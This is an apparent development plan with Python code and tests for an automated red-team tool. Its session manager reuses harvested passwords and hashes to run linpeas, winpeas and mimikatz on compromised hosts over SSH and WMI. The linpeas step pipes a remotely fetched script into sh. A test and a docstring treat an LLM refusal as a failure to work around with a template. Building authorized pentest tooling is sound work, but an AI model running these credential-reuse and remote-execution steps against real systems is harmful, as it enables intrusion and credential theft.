    result = await lin.linpeas_run.ainvoke({
        "foothold_id": "f-1", "host_ip": "10.0.0.5", "engagement_id": "e1",
    })
    assert result.suid_binaries == []
    assert result.command.startswith("curl -sL")


async def test_linpeas_falls_back_when_execution_fails(monkeypatch, tmp_path):
    """Manager installed but execute fails → evidence-string fallback."""
    import autored.tools.linpeas as lin

    async def fake_save_raw(tool, target, stdout, stderr, engagement_id):
        p = tmp_path / f"{tool}.out"
        p.write_text(stdout)
        return str(p)

    mgr = MagicMock()
    mgr.find_foothold = MagicMock(return_value=_foothold())
    mgr.execute = AsyncMock(return_value=FootholdCommandResult(
        command="linpeas", stdout="", stderr="connection refused",
        returncode=255, duration_sec=0.1, success=False,
    ))
    monkeypatch.setattr(lin, "_save_raw", fake_save_raw)
    monkeypatch.setattr(lin, "get_installed", lambda: mgr)

    result = await lin.linpeas_run.ainvoke({
        "foothold_id": "f-1", "host_ip": "10.0.0.5", "engagement_id": "e1",
    })
    assert result.suid_binaries == []  # nothing parsed — but no crash either
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `uv run pytest tests/unit/test_foothold_session.py tests/unit/tools/test_linpeas_execute.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.foothold_session'`

- [ ] **Step 4: Write the session manager**

```python
# autored/foothold_session.py
"""Foothold session manager — executes commands on live footholds (Phase 6).

Phase 4 shipped the enum/cred-harvest wrappers (linpeas, winpeas, mimikatz)
in evidence-string mode: they saved the command for a human to run and
returned empty results. Phase 5 added the transport layer (impacket
remote-exec for Windows, sshpass for Linux SSH footholds). This module
joins them: given an EngagementState it resolves credentials from
``harvested_secrets`` and transports a command to the foothold's host.

Usage: ``postex_node`` wraps its foothold loop in
``with foothold_session_context(state):`` — every wrapper that calls
``get_installed()`` then executes for real instead of saving a command
string. Single engagement per process is the CLI's reality; the context
manager guarantees uninstall on exceptions.
"""
from contextlib import contextmanager

from pydantic import BaseModel

from autored.logging import get_logger
from autored.subprocess_runner import run_subprocess
from autored.tools.impacket_remote import impacket_wmiexec

log = get_logger("foothold_session")

SSH_TIMEOUT_SEC = 300
IMPACKET_TIMEOUT_SEC = 300


class FootholdCommandResult(BaseModel):
    command: str
    stdout: str
    stderr: str
    returncode: int
    duration_sec: float
    success: bool


class CredentialBundle(BaseModel):
    username: str = ""
    password: str = ""
    nthash: str = ""


def _find_credentials_for_host(state, host_ip: str) -> CredentialBundle:
    """Resolve credentials for a host from harvested secrets.

    Passwords beat hashes (impacket + ssh both prefer them); usernames are
    parsed from ``Secret.source`` — credharvester writes
    ``mimikatz:<provider>/<username>`` — falling back to a foothold's own
    username for that host.
    """
    bundle = CredentialBundle()
    for secret in state.harvested_secrets:
        if secret.host_ip != host_ip:
            continue
        if secret.secret_type == "password" and not bundle.password:
            bundle.password = secret.secret_value
        elif secret.secret_type == "hash" and not bundle.nthash:
            bundle.nthash = secret.secret_value
        if "/" in secret.source and not bundle.username:
            candidate = secret.source.rsplit("/", 1)[-1].strip()
            if candidate and candidate.lower() not in {"null", "(null)"}:
                bundle.username = candidate
    if not bundle.username:
        for foothold in state.footholds:
            if foothold.host_ip == host_ip and foothold.username:
                bundle.username = foothold.username
                break
    return bundle


def _build_ssh_cmd(username: str, password: str, host: str, command: str) -> list[str]:
    return [
        "sshpass", "-p", password,
        "ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
        f"{username}@{host}", command,
    ]


class FootholdSessionManager:
    """Executes commands on footholds using state-resolved credentials."""

    def __init__(self, state):
        self.state = state

    def find_foothold(self, foothold_id: str):
        for foothold in self.state.footholds:
            if foothold.id == foothold_id:
                return foothold
        return None

    async def execute(self, foothold, command: str, timeout: int = 300) -> FootholdCommandResult:
        host = foothold.host_ip
        bundle = _find_credentials_for_host(self.state, host)

        if foothold.access_type == "ssh":
            username = bundle.username or foothold.username
            if not bundle.password:
                return FootholdCommandResult(
                    command=command, stdout="", stderr="no password secret for ssh host",
                    returncode=-1, duration_sec=0.0, success=False,
                )
            cmd = _build_ssh_cmd(username, bundle.password, host, command)
            log.info("foothold_exec_ssh", host=host, username=username)
            sub = await run_subprocess(cmd, timeout=timeout)
            return FootholdCommandResult(
                command=command, stdout=sub.stdout, stderr=sub.stderr,
                returncode=sub.returncode, duration_sec=sub.duration_sec,
                success=sub.returncode == 0,
            )

        if foothold.access_type in ("winrm", "rpc"):
            if not (bundle.password or bundle.nthash):
                return FootholdCommandResult(
                    command=command, stdout="",
                    stderr="no password/hash secret for windows host",
                    returncode=-1, duration_sec=0.0, success=False,
                )
            username = bundle.username or foothold.username
            log.info("foothold_exec_wmiexec", host=host, username=username)
            impacket_result = await impacket_wmiexec.ainvoke({
                "username": username,
                "password": bundle.password,
                "nthash": bundle.nthash,
                "target": host,
                "command": command,
                "engagement_id": self.state.engagement_id,
            })
            return FootholdCommandResult(
                command=command, stdout=impacket_result.output,
                stderr="" if impacket_result.success else impacket_result.output,
                returncode=0 if impacket_result.success else 1,
                duration_sec=impacket_result.duration_sec,
                success=impacket_result.success,
            )

        return FootholdCommandResult(
            command=command, stdout="",
            stderr=f"no transport for access_type {foothold.access_type!r}",
            returncode=-1, duration_sec=0.0, success=False,
        )


# --- module-level install (single engagement per process) ----------------- #

_current_manager: FootholdSessionManager | None = None


def install(manager: FootholdSessionManager) -> None:
    global _current_manager
    _current_manager = manager


def uninstall() -> None:
    global _current_manager
    _current_manager = None


def get_installed() -> FootholdSessionManager | None:
    return _current_manager


@contextmanager
def foothold_session_context(state):
    """Install a session manager for the duration of a post-ex pass."""
    manager = FootholdSessionManager(state)
    install(manager)
    try:
        yield manager
    finally:
        uninstall()
```

- [ ] **Step 5: Rewire the three wrappers**

In `autored/tools/linpeas.py` — add the import and the execution branch at the top of `linpeas_run`'s body (keep everything else, including the fallback tail, unchanged):

```python
from autored.foothold_session import get_installed
```

Replace the body of `linpeas_run` after the `log.info("linpeas_start", ...)` line with:

```python
    cmd_str = (
        "curl -sL "
        "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh "
        "| sh"
    )
    # Phase 6: execute via the foothold session manager when installed.
    session = get_installed()
    if session is not None:
        foothold = session.find_foothold(foothold_id)
        exec_result = None
        if foothold is not None:
            exec_result = await session.execute(foothold, cmd_str)
        if exec_result is not None and exec_result.success:
            raw_path = await _save_raw(
                "linpeas", host_ip, exec_result.stdout, exec_result.stderr, engagement_id,
            )
            parsed = _parse_linpeas_output(exec_result.stdout, host_ip)
            parsed.raw_output_path = raw_path
            parsed.command = cmd_str
            parsed.duration_sec = exec_result.duration_sec
            log.info("linpeas_executed", host_ip=host_ip, duration=exec_result.duration_sec)
            return parsed
        log.warning("linpeas_execution_unavailable", host_ip=host_ip,
                    stderr=(exec_result.stderr if exec_result else "foothold not found"))
    # Fallback: evidence-string mode (Phase 4 behavior).
    raw_path = await _save_raw("linpeas_cmd", host_ip, cmd_str, "", engagement_id)
    log.info("linpeas_done", host_ip=host_ip, note="command saved, execution unavailable")
    return LinpeasResult(host_ip=host_ip, raw_output_path=raw_path, command=cmd_str)
```

Apply the **same pattern** to `autored/tools/winpeas.py` (parse with `_parse_winpeas_output`, raw tool tag `"winpeas"`, fallback tag `"winpeas_cmd"`) and `autored/tools/mimikatz.py` (parse with `_parse_mimikatz_output`, raw tool tags `"mimikatz"` / `"mimikatz_cmd"`, command from `_build_mimikatz_cmd()`). The `get_installed` import line is identical in all three files.

In `autored/agents/postex.py` — wrap the foothold loop:

```python
from autored.foothold_session import foothold_session_context
```

```python
    # Phase 6: install the foothold session manager so enum/cred-harvest
    # wrappers execute on live footholds (evidence-string fallback when
    # no transport exists for a foothold's access_type).
    with foothold_session_context(state):
        for foothold in state.footholds:
            ...  # existing loop body, re-indented one level
```

(The loop body is re-indented; nothing inside it changes. The existing Phase 4 integration test still passes because its sub-agents are mocked — the installed manager is simply never consulted.)

- [ ] **Step 6: Run tests to verify they pass**

Run: `uv run pytest tests/unit/test_foothold_session.py tests/unit/tools/test_linpeas_execute.py tests/integration/test_postex_agent.py tests/integration/test_phase4_pipeline.py -v`
Expected: PASS — new tests green, Phase 4 tests unchanged (mocked sub-agents bypass the manager).

- [ ] **Step 7: Commit**

```bash
git add autored/foothold_session.py autored/tools/linpeas.py autored/tools/winpeas.py \
        autored/tools/mimikatz.py autored/agents/postex.py \
        tests/unit/test_foothold_session.py tests/unit/tools/test_linpeas_execute.py \
        tests/fixtures/linpeas_sample_output.txt tests/fixtures/winpeas_sample_output.txt \
        tests/fixtures/mimikatz_sample_output.txt
git commit -m "feat: foothold session manager executes linpeas/winpeas/mimikatz on live footholds"
```

---

## Task 3: MITREMapper Sub-Agent (Rules-Based, Embedded ATT&CK Index)

**Files:**
- Create: `autored/subagents/mitremapper.py`
- Modify: `autored/subagents/__init__.py`
- Test: `tests/unit/subagents/test_mitremapper.py` (NEW)

**Interfaces:**
- Consumes: `MitreMapping` from `autored.models.report` (Task 1); state records serialized as a dict by the caller (Task 9's `_build_engagement_summary`).
- Produces:
  - `MITRE_TECHNIQUES: dict[str, tuple[str, str]]` — the embedded index, ~35 entries: `technique_id -> (technique_name, tactic)`. **Every emitted mapping's ID must be a key of this dict** (Review Focus #4 — anti-hallucination guard).
  - `MitreMapperOutput(mappings: list[MitreMapping])` — Pydantic output model.
  - `@tool async def mitremapper_subagent(engagement_records: str, engagement_id: str = "") -> MitreMapperOutput` — `engagement_records` is a JSON string: `{"recon_hosts": int, "vuln_scans": int, "footholds": [{"method", "access_type", "host_ip"}], "privesc_attempts": [{"technique", "category", "success"}], "persistence_artifacts": [{"method", "host_ip"}], "evasion_actions": [{"technique"}], "exfiltration_proof": [{"method"}], "pivots": [{"method", "target_host", "success"}], "tunnels": [{"tool"}], "cred_methods": ["mimikatz", "secretsdump", ...], "bloodhound": bool}`.
  - `_map_records(records: dict) -> list[MitreMapping]` — the pure mapping core (unit-tested directly, no LLM, no async).

**Design note — why rules and not an LLM:** the spec's sub-agent inventory (§7.4) says MITREMapper "maps findings to ATT&CK technique IDs" but never says the mapping must be LLM-driven. An LLM left to recall technique IDs invents plausible-looking ones (`T1046` vs `T1047` drift, sub-technique numbering errors). A keyword table over the structured state is deterministic, instant, free, and auditable — the same reasoning that made the RoE Guard non-LLM (spec §2.4). Every state collection maps through an explicit rule; unmapped activity is skipped.

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/subagents/test_mitremapper.py
"""Unit tests for the rules-based MITREMapper sub-agent (Phase 6 Task 3)."""
from autored.models.report import MitreMapping
from autored.subagents.mitremapper import (
    MITRE_TECHNIQUES,
    _map_records,
    mitremapper_subagent,
)


def _records(**overrides) -> dict:
    base = {
        "recon_hosts": 3,
        "vuln_scans": 2,
        "footholds": [],
        "privesc_attempts": [],
        "persistence_artifacts": [],
        "evasion_actions": [],
        "exfiltration_proof": [],
        "pivots": [],
        "tunnels": [],
        "cred_methods": [],
        "bloodhound": False,
    }
    base.update(overrides)
    return base


def test_every_index_entry_is_well_formed():
    for technique_id, (name, tactic) in MITRE_TECHNIQUES.items():
        assert technique_id.startswith("T"), technique_id
        assert len(technique_id) in (4, 6, 7, 8), technique_id  # T1046 / T1053.005
        assert name and tactic


def test_recon_maps_to_discovery():
    mappings = _map_records(_records())
    ids = {m.technique_id for m in mappings}
    assert "T1046" in ids  # Network Service Discovery (nmap sweep)
    assert "T1595.002" in ids  # Vulnerability Scanning (nuclei)


def test_foothold_method_mapping():
    mappings = _map_records(_records(footholds=[
        {"method": "ms17_010", "access_type": "rpc", "host_ip": "10.0.0.5"},
        {"method": "sqli", "access_type": "webshell", "host_ip": "10.0.0.6"},
        {"method": "ssh_brute", "access_type": "ssh", "host_ip": "10.0.0.7"},
    ]))
    ids = {m.technique_id for m in mappings}
    assert "T1210" in ids  # Exploitation of Remote Services (S EternalBlue)
    assert "T1190" in ids  # Exploit Public-Facing Application (sqli)
    assert "T1110" in ids  # Brute Force (ssh_brute)


def test_persistence_method_mapping():
    mappings = _map_records(_records(persistence_artifacts=[
        {"method": "scheduled_task", "host_ip": "10.0.0.5"},
        {"method": "cron", "host_ip": "10.0.0.7"},
        {"method": "ssh_authorized_keys", "host_ip": "10.0.0.7"},
    ]))
    ids = {m.technique_id for m in mappings}
    assert "T1053.005" in ids  # Scheduled Task
    assert "T1053.003" in ids  # Cron
    assert "T1098.004" in ids  # SSH Authorized Keys


def test_evasion_and_exfil_mapping():
    mappings = _map_records(_records(
        evasion_actions=[{"technique": "amsi_bypass"}, {"technique": "log_clear"}],
        exfiltration_proof=[{"method": "dns"}],
    ))
    ids = {m.technique_id for m in mappings}
    assert "T1562.001" in ids  # Disable/Modify Tools (AMSI bypass)
    assert "T1070.001" in ids  # Clear Windows Event Logs
    assert "T1048.003" in ids  # Exfiltration Over Alternative Protocol: DNS


def test_pivot_and_tunnel_mapping():
    mappings = _map_records(_records(
        pivots=[{"method": "wmiexec", "target_host": "10.0.0.8", "success": True}],
        tunnels=[{"tool": "ligolo"}],
    ))
    ids = {m.technique_id for m in mappings}
    assert "T1047" in ids  # WMI
    assert "T1090.001" in ids  # Internal Proxy


def test_cred_harvest_mapping():
    mappings = _map_records(_records(cred_methods=["mimikatz", "secretsdump"]))
    ids = {m.technique_id for m in mappings}
    assert "T1003.001" in ids  # LSASS Memory (mimikatz)
    assert "T1003.003" in ids  # NTDS (secretsdump)


def test_unmapped_activity_is_skipped_never_invented():
    """Review Focus #4 — an unknown method must not produce any mapping."""
    mappings = _map_records(_records(
        footholds=[{"method": "quantum_exploit", "access_type": "ssh", "host_ip": "x"}],
        pivots=[{"method": "teleport", "target_host": "y", "success": True}],
    ))
    ids = {m.technique_id for m in mappings}
    # discovery mappings from recon_hosts/vuln_scans are fine, but nothing for the junk
    assert all(mid in MITRE_TECHNIQUES for mid in ids)
    junk_sources = {m.source for m in mappings}
    assert "foothold" not in junk_sources or all(
        m.technique_id in {"T1110", "T1210", "T1190"} for m in mappings if m.source == "foothold"
    )


def test_empty_records_produce_discovery_only():
    mappings = _map_records(_records(recon_hosts=0, vuln_scans=0))
    assert mappings == []


async def test_subagent_tool_round_trip():
    import json
    records = _records(pivots=[{"method": "ssh", "target_host": "10.0.0.9", "success": True}])
    output = await mitremapper_subagent.ainvoke({
        "engagement_records": json.dumps(records),
        "engagement_id": "e1",
    })
    assert isinstance(output, MitreMapping) or hasattr(output, "mappings")
    ids = {m.technique_id for m in output.mappings}
    assert "T1021.004" in ids  # SSH lateral
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/subagents/test_mitremapper.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.subagents.mitremapper'`

- [ ] **Step 3: Write the sub-agent**

```python
# autored/subagents/mitremapper.py
"""MITREMapper sub-agent — maps engagement activity to ATT&CK technique IDs.

Rules-based by design (Phase 6 plan): the embedded ``MITRE_TECHNIQUES``
index is the only source of technique IDs this module may emit. An LLM
recalling technique IDs invents plausible-looking nonexistent ones; a
keyword table over structured state is deterministic and auditable —
the same reasoning that made the RoE Guard non-LLM (spec §2.4).

Spec reference: §7.4 (Report sub-agents), §13.6.
"""
import json

from langchain_core.tools import tool
from pydantic import BaseModel, Field

from autored.logging import get_logger
from autored.models.report import MitreMapping

log = get_logger("subagents.mitremapper")

# technique_id -> (technique_name, tactic)
MITRE_TECHNIQUES: dict[str, tuple[str, str]] = {
    # Discovery
    "T1046": ("Network Service Discovery", "discovery"),
    "T1046.002": ("Network Service Discovery: Network Share Discovery", "discovery"),
    "T1087.002": ("Account Discovery: Domain Account", "discovery"),
    "T1018": ("Remote System Discovery", "discovery"),
    "T1482": ("Domain Trust Discovery", "discovery"),
    "T1595.002": ("Active Scanning: Vulnerability Scanning", "reconnaissance"),
    # Initial access / execution
    "T1190": ("Exploit Public-Facing Application", "initial-access"),
    "T1203": ("Exploitation for Client Execution", "execution"),
    "T1210": ("Exploitation of Remote Services", "lateral-movement"),
    "T1110": ("Brute Force", "credential-access"),
    # Privilege escalation
    "T1068": ("Exploitation for Privilege Escalation", "privilege-escalation"),
    "T1548": ("Abuse Elevation Control Mechanism", "privilege-escalation"),
    "T1548.003": ("Abuse Elevation Control Mechanism: Sudo and Sudo Caching", "privilege-escalation"),
    # Persistence
    "T1053.005": ("Scheduled Task/Job: Scheduled Task", "persistence"),
    "T1053.003": ("Scheduled Task/Job: Cron", "persistence"),
    "T1543.003": ("Create or Modify System Process: Windows Service", "persistence"),
    "T1543.002": ("Create or Modify System Process: Systemd Service", "persistence"),
    "T1060": ("Registry Run Keys / Startup Folder", "persistence"),
    "T1098.004": ("Account Manipulation: SSH Authorized Keys", "persistence"),
    "T1546.003": ("Event Triggered Execution: WMI Event Subscription", "persistence"),
    "T1546.004": ("Event Triggered Execution: Unix Shell Configuration Modification", "persistence"),
    "T1574.001": ("Hijack Execution Flow: DLL Search Order Hijacking", "persistence"),
    # Credential access
    "T1003.001": ("OS Credential Dumping: LSASS Memory", "credential-access"),
    "T1003.003": ("OS Credential Dumping: NTDS", "credential-access"),
    "T1552": ("Unsecured Credentials", "credential-access"),
    # Defense evasion
    "T1562.001": ("Impair Defenses: Disable or Modify Tools", "defense-evasion"),
    "T1070.001": ("Indicator Removal: Clear Windows Event Logs", "defense-evasion"),
    "T1055": ("Process Injection", "defense-evasion"),
    # Collection / exfiltration
    "T1041": ("Exfiltration Over C2 Channel", "exfiltration"),
    "T1048": ("Exfiltration Over Alternative Protocol", "exfiltration"),
    "T1048.003": ("Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol", "exfiltration"),
    # Lateral movement
    "T1047": ("Windows Management Instrumentation", "lateral-movement"),
    "T1021.002": ("Remote Services: SMB/Windows Admin Shares", "lateral-movement"),
    "T1021.004": ("Remote Services: SSH", "lateral-movement"),
    "T1021.006": ("Remote Services: Windows Remote Management", "lateral-movement"),
    "T1550": ("Use Alternate Authentication Material", "lateral-movement"),
    "T1090.001": ("Proxy: Internal Proxy", "command-and-control"),
}

# Keyword rules: state collection -> (match key within record, {value or substring: technique_id})
_FOOTHOLD_METHOD_RULES = {
    "ms17_010": "T1210", "eternalblue": "T1210", "smb": "T1210",
    "sqli": "T1190", "sqlmap": "T1190", "web": "T1190",
    "ssh_brute": "T1110", "brute": "T1110", "hydra": "T1110",
    "msf": "T1203", "client": "T1203",
}
_PRIVESC_RULES = {
    "kernel": "T1068", "dirty_pipe": "T1068", "dirty_cow": "T1068",
    "sudo": "T1548.003", "suid": "T1548",
    "service": "T1543.003", "polkit": "T1068",
}
_PERSISTENCE_RULES = {
    "scheduled_task": "T1053.005", "cron": "T1053.003",
    "systemd": "T1543.002", "service": "T1543.003",
    "registry_run": "T1060", "ssh_authorized_keys": "T1098.004",
    "wmi_subscription": "T1546.003", "bashrc": "T1546.004",
    "dll_hijack": "T1574.001",
}
_EVASION_RULES = {
    "amsi_bypass": "T1562.001", "etw_patch": "T1562.001",
    "defender_disable": "T1562.001", "log_clear": "T1070.001",
    "process_injection": "T1055",
}
_EXFIL_RULES = {"https": "T1041", "dns": "T1048.003", "icmp": "T1048", "smb": "T1021.002"}
_PIVOT_RULES = {
    "wmiexec": "T1047", "psexec": "T1021.002", "smbexec": "T1021.002",
    "ssh": "T1021.004", "winrm": "T1021.006",
    "crackmapexec": "T1550", "certipy": "T1550",
}
_TUNNEL_RULES = {"ligolo": "T1090.001", "chisel": "T1090.001", "proxychains": "T1090.001"}
_CRED_METHOD_RULES = {
    "mimikatz": "T1003.001", "lsass": "T1003.001",
    "secretsdump": "T1003.003", "ntds": "T1003.003",
    "sam_dump": "T1003.002",
}


class MitreMapperOutput(BaseModel):
    mappings: list[MitreMapping] = Field(default_factory=list)


def _match(rule_key: str, rules: dict[str, str], source: str, tactic_source: str,
           detail: str, out: list[MitreMapping]) -> None:
    """Add a mapping if rule_key matches; never emit IDs outside the index."""
    key = rule_key.lower()
    for pattern, technique_id in rules.items():
        if pattern in key or pattern in rule_key.lower():
            if technique_id in MITRE_TECHNIQUES:
                name, tactic = MITRE_TECHNIQUES[technique_id]
                out.append(MitreMapping(
                    technique_id=technique_id, technique_name=name,
                    tactic=tactic, source=tactic_source, detail=detail,
                ))
            return  # first matching pattern wins — one technique per record


def _map_records(records: dict) -> list[MitreMapping]:
    """Map serialized engagement records to ATT&CK mappings (pure function)."""
    out: list[MitreMapping] = []

    if records.get("recon_hosts"):
        name, tactic = MITRE_TECHNIQUES["T1046"]
        out.append(MitreMapping(technique_id="T1046", technique_name=name, tactic=tactic,
                                source="recon", detail=f"{records['recon_hosts']} hosts scanned"))
    if records.get("vuln_scans"):
        name, tactic = MITRE_TECHNIQUES["T1595.002"]
        out.append(MitreMapping(technique_id="T1595.002", technique_name=name, tactic=tactic,
                                source="vuln", detail=f"{records['vuln_scans']} vulnerability scans"))

    for foothold in records.get("footholds", []):
        _match(foothold.get("method", ""), _FOOTHOLD_METHOD_RULES, foothold.get("method", ""),
               "foothold", f"{foothold.get('method')} on {foothold.get('host_ip')}", out)

    for attempt in records.get("privesc_attempts", []):
        if not attempt.get("success"):
            continue
        _match(attempt.get("technique", ""), _PRIVESC_RULES, attempt.get("technique", ""),
               "privesc", f"{attempt.get('technique')} ({attempt.get('category')})", out)

    for artifact in records.get("persistence_artifacts", []):
        _match(artifact.get("method", ""), _PERSISTENCE_RULES, artifact.get("method", ""),
               "persistence", f"{artifact.get('method')} on {artifact.get('host_ip')}", out)

    for action in records.get("evasion_actions", []):
        _match(action.get("technique", ""), _EVASION_RULES, action.get("technique", ""),
               "evasion", action.get("technique", ""), out)

    for proof in records.get("exfiltration_proof", []):
        _match(proof.get("method", ""), _EXFIL_RULES, proof.get("method", ""),
               "exfiltration", proof.get("method", ""), out)

    for pivot in records.get("pivots", []):
        if not pivot.get("success"):
            continue
        _match(pivot.get("method", ""), _PIVOT_RULES, pivot.get("method", ""),
               "pivot", f"{pivot.get('method')} to {pivot.get('target_host')}", out)

    for tunnel in records.get("tunnels", []):
        _match(tunnel.get("tool", ""), _TUNNEL_RULES, tunnel.get("tool", ""),
               "tunnel", tunnel.get("tool", ""), out)

    for method in records.get("cred_methods", []):
        _match(method, _CRED_METHOD_RULES, method, "credential-access", method, out)

    if records.get("bloodhound"):
        name, tactic = MITRE_TECHNIQUES["T1482"]
        out.append(MitreMapping(technique_id="T1482", technique_name=name, tactic=tactic,
                                source="postex", detail="BloodHound domain collection"))

    # Deduplicate on (technique_id, source) — repeated artifacts collapse to one row.
    seen: set[tuple[str, str]] = set()
    deduped: list[MitreMapping] = []
    for mapping in out:
        key = (mapping.technique_id, mapping.source)
        if key not in seen:
            seen.add(key)
            deduped.append(mapping)
    return deduped


@tool
async def mitremapper_subagent(engagement_records: str, engagement_id: str = "") -> MitreMapperOutput:
    """Map engagement activity to MITRE ATT&CK technique IDs.

    Rules-based: only technique IDs from the embedded index are ever
    emitted; unmapped activity is skipped (never guessed).

    Args:
        engagement_records: JSON string produced by the Report Agent's
            engagement summary builder.
        engagement_id: Current engagement ID.

    Returns:
        MitreMapperOutput with deduplicated MitreMapping rows.
    """
    log.info("mitremapper_start", engagement_id=engagement_id)
    records = json.loads(engagement_records) if isinstance(engagement_records, str) else engagement_records
    mappings = _map_records(records)
    log.info("mitremapper_done", engagement_id=engagement_id, mappings=len(mappings))
    return MitreMapperOutput(mappings=mappings)
```

Add to `autored/subagents/__init__.py`:

```python
from autored.subagents.mitremapper import mitremapper_subagent  # noqa: F401
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/subagents/test_mitremapper.py -v`
Expected: PASS (12 tests)

- [ ] **Step 5: Commit**

```bash
git add autored/subagents/mitremapper.py autored/subagents/__init__.py \
        tests/unit/subagents/test_mitremapper.py
git commit -m "feat: rules-based MITREMapper sub-agent with embedded ATT&CK index"
```

---

## Task 4: ExecSummaryWriter Sub-Agent (LLM + Template Fallback)

**Files:**
- Create: `autored/subagents/execsummarywriter.py`
- Modify: `autored/subagents/__init__.py`
- Test: `tests/unit/subagents/test_execsummarywriter.py` (NEW)

**Interfaces:**
- Consumes: `get_model("write_report")` from `autored.router`; the engagement-summary JSON produced by Task 9's `_build_engagement_summary(state) -> dict` (serialized to a string by the caller).
- Produces:
  - `ExecSummaryOutput(summary_markdown: str, used_fallback: bool)`.
  - `@tool async def execsummarywriter_subagent(engagement_summary: str, engagement_id: str = "") -> ExecSummaryOutput`.
  - `_parse_summary_dict(engagement_summary: str) -> dict` — JSON-string → dict (tolerates an already-decoded dict).
  - `_template_exec_summary(summary: dict) -> str` — the deterministic one-page fallback (Review Focus #3): always renders, counts and outcome included.
  - `EXEC_SUMMARY_PROMPT` — the LLM prompt template (spec §6.7 step 1: "Generate executive summary").

- [ ] **Step 1: Write the failing tests**

```python
# tests/unit/subagents/test_execsummarywriter.py
"""Unit tests for ExecSummaryWriter (Phase 6 Task 4)."""
import json
from unittest.mock import AsyncMock, MagicMock, patch

from autored.subagents.execsummarywriter import (
    _parse_summary_dict,
    _template_exec_summary,
    execsummarywriter_subagent,
)


def _summary() -> dict:
    return {
        "engagement_id": "e1",
        "target": "10.10.10.5",
        "operator": "tester",
        "duration_min": 42.0,
        "hosts": 1,
        "services": 5,
        "findings": 3,
        "findings_by_severity": {"critical": 1, "high": 1, "medium": 1, "low": 0, "info": 0},
        "footholds": 1,
        "privesc_successes": 1,
        "pivots": 1,
        "sub_engagements": 1,
        "cleanup_all_verified": True,
        "outcome": "full chain achieved",
    }


def test_parse_summary_dict_round_trip():
    parsed = _parse_summary_dict(json.dumps(_summary()))
    assert parsed["engagement_id"] == "e1"
    assert _parse_summary_dict(_summary())["footholds"] == 1  # dict passthrough


def test_template_renders_all_key_facts():
    md = _template_exec_summary(_summary())
    assert "10.10.10.5" in md
    assert "1 host" in md or "1 hosts" in md
    assert "1 critical" in md
    assert "full chain achieved" in md
    assert "cleanup" in md.lower()


async def test_llm_path_returns_model_content():
    mock_response = MagicMock()
    mock_response.content = "## Executive Summary\n\nAutoRed achieved a full chain."
    with patch("autored.subagents.execsummarywriter.get_model") as mock_get_model:
        mock_model = AsyncMock()
        mock_model.ainvoke = AsyncMock(return_value=mock_response)
        mock_get_model.return_value = mock_model

        output = await execsummarywriter_subagent.ainvoke({
            "engagement_summary": json.dumps(_summary()),
            "engagement_id": "e1",
        })
    assert output.summary_markdown.startswith("## Executive Summary")
    assert output.used_fallback is False


async def test_llm_failure_falls_back_to_template():
    """Review Focus #3 — API failure must never lose the deliverable."""
    with patch("autored.subagents.execsummarywriter.get_model") as mock_get_model:
        mock_model = AsyncMock()
        mock_model.ainvoke = AsyncMock(side_effect=RuntimeError("503 service unavailable"))
        mock_get_model.return_value = mock_model

        output = await execsummarywriter_subagent.ainvoke({
            "engagement_summary": json.dumps(_summary()),
            "engagement_id": "e1",
        })
    assert output.used_fallback is True
    assert "10.10.10.5" in output.summary_markdown


async def test_llm_refusal_falls_back_to_template():
    mock_response = MagicMock()
    mock_response.content = "I cannot assist with this request."
    with patch("autored.subagents.execsummarywriter.get_model") as mock_get_model:
        mock_model = AsyncMock()
        mock_model.ainvoke = AsyncMock(return_value=mock_response)
        mock_get_model.return_value = mock_model

        output = await execsummarywriter_subagent.ainvoke({
            "engagement_summary": json.dumps(_summary()),
            "engagement_id": "e1",
        })
    assert output.used_fallback is True


async def test_empty_llm_response_falls_back():
    mock_response = MagicMock()
    mock_response.content = ""
    with patch("autored.subagents.execsummarywriter.get_model") as mock_get_model:
        mock_model = AsyncMock()
        mock_model.ainvoke = AsyncMock(return_value=mock_response)
        mock_get_model.return_value = mock_model

        output = await execsummarywriter_subagent.ainvoke({
            "engagement_summary": json.dumps(_summary()),
            "engagement_id": "e1",
        })
    assert output.used_fallback is True
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/subagents/test_execsummarywriter.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'autored.subagents.execsummarywriter'`

- [ ] **Step 3: Write the sub-agent**

```python
# autored/subagents/execsummarywriter.py
"""ExecSummaryWriter sub-agent — one-page non-technical summary (spec §7.4).

LLM-written via ``get_model("write_report")`` with a deterministic
template fallback: an API failure or refusal can never cost the operator
the engagement deliverable (plan Review Focus #3).
"""
import json

from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.router import get_model

log = get_logger("subagents.execsummarywriter")

EXEC_SUMMARY_PROMPT = """You are the ExecSummaryWriter sub-agent in AutoRed, a red team automation system.
Write a one-page executive summary of this engagement for a non-technical
stakeholder. Plain language, no command lines, no credential material.

Engagement facts (JSON):
{summary_json}

Rules:
- Start with "## Executive Summary"
- Cover: what was tested, what was achieved (footholds, privilege escalation,
  lateral movement), overall risk in one sentence, and cleanup confirmation
- 150-300 words. No tables. No secrets or hashes.
"""


class ExecSummaryOutput(BaseModel):
    summary_markdown: str
    used_fallback: bool = False


def _parse_summary_dict(engagement_summary: str) -> dict:
    if isinstance(engagement_summary, dict):
        return engagement_summary
    return json.loads(engagement_summary)


def _template_exec_summary(summary: dict) -> str:
    """Deterministic fallback — always renders the key facts."""
    severity = summary.get("findings_by_severity", {})
    crit = severity.get("critical", 0)
    high = severity.get("high", 0)
    lines = [
        "## Executive Summary",
        "",
        f"**Engagement:** {summary.get('engagement_id', 'unknown')} "
        f"against {summary.get('target', 'unknown target')}.",
        "",
        f"AutoRed mapped **{summary.get('hosts', 0)} host(s)** and "
        f"**{summary.get('services', 0)} service(s)**, and identified "
        f"**{summary.get('findings', 0)} finding(s)** "
        f"({crit} critical, {high} high).",
        "",
        f"The engagement achieved **{summary.get('footholds', 0)} foothold(s)**, "
        f"**{summary.get('privesc_successes', 0)} successful privilege escalation(s)**, "
